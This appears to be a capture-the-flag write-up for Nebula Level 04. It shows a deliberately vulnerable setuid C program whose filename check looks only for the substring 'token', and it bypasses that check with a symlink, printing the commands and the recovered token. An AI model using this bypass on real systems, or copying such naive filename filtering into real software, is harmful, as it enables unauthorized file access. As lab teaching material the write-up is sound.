---
author: Josh Genao
Date: 2023-01-02
Category: #symlink
Tags: #symlinkattack
---

# Level-04
## Description
This level requires you to read the **token** file, but the code restricts the files that can be read. Find a way to bypass it :)

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

## Setup
SSH into the Nebula VM using the following credentials:

```
username: level04
password: level04
```
## Summary
The program reads in and outputs the contents of whatever file is passed into the first argument. The program restricts the `token` file located in the `/home/flag04` by comparing the argument with the substring "token" .

We can bypass this check by doing a symlink attack in which will allow us to get permissions to the `/home/flag04/token` file. 

This can be done doing the following:

```
level04@nebula:~$ ln -s /home/flag04/token exploit
level04@nebula:~$ cd /home/flag04/
level04@nebula:/home/flag04$ ./flag04 /home/level04/exploit
06508b5e-8909-4f38-b630-fdb148a848a2
```
Running the flag04 application gives us a string of characters. This can be used as the password for flag04 user.
## Flag
![](../imgs/Pasted%20image%2020230102220317.png)
## References
[^1]: https://www.exploit-db.com/papers/13199
